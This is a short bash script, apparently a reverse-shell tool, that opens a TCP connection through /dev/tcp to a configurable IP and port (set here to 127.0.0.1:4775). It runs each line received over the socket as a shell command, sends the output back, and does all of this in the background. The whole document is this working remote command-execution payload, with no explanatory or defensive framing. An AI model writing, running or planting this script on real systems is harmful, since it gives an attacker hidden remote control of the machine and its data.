#!/bin/bash
IP=127.0.0.1
PORT=4775
#TODO file descriptor as variable
((exec 5<>/dev/tcp/$IP/$PORT; cat <&5 | while read line; do $line 2>&5 >&5; done) & ) 2>&1
